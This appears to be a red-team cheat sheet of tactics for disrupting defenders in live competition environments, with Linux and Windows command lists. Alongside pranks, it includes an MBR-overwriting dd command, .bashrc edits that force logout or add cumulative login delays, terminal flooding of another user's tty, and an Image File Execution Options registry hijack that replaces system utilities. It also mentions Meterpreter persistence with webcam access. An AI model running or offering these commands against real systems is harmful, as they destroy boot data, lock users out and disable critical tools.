A small collection of tactics to mess with blue teamers in live environments...

# Linux

```shell
xrandr -o inverted # Flip X11 desktop session upside down.
tty # Retrieve TTY number (for redirection)
w   # Gives you you /dev/pts numbers

git clone https://github.com/klange/nyancat.git
cd nyancat
make
cd src
./nyancat > /dev/pts/<pts-num-of-opponent>

dd if=nyan.mbr of=/dev/sda # NyanMBR necessary, overwrites Master Boot Recrd with Nyancat animation. The MBR image can be found in this repository: https://github.com/brainsmoke/nyanmbr

echo exit >> ~/.bashrc # Add a logout to the login script

cat /dev/urandom > /dev/pts/[pts-num-of-opponent] # Fill terminal with random noise spewing out at high speed.

echo "echo "sleep 1;" >> ~/.bashrc">> ~/.bashrc # Add a longer sleep to their terminal startup every time they login. 

cat /dev/random > /dev/[pts-num-of-opponent] # write random stuff to your opponent's terminal. The brackets are just to show you that the tty-num is a parameter

telnet towel.blinkenlights.nl > /dev/[pts-num-of-opponent]

export PROMPT_CMD="clear && echo 'You didn't say the magic word!'"
```

# Windows
```powershell
start C:\Windows\Resources\Ease of Access Themes\hc1.theme # Start the Windows high-contrast theme

reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "VALUE" /f # Modify mouse speed

reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<CRITICAL SYSTEM UTILITY OF YOUR CHOICE>" /v "Debugger" /t REG_SZ /d "\"<GOOFY IMAGE FILE OR OTHER>" /z" /f # Replaces the executables with a "debugger"... or a weird image of your choosing. 

Desktop Goose 👀
```

Persistence with [[Meterpreter]] affords many options like `webcam_chat`. 

***DoS WITH GEESE***
You can download and install the [Desktop Goose](https://samperson.itch.io/desktop-goose/download/eyJleHBpcmVzIjoxNzM5NDE2Mjg0LCJpZCI6NTU4MjE4fQ%3d%3d.RdlBCXbB6sF2fBp3tD9%2f19MhrZs%3d) on Windows and Mac. Running ten or more Desktop Geese may crash the adversary's computer.
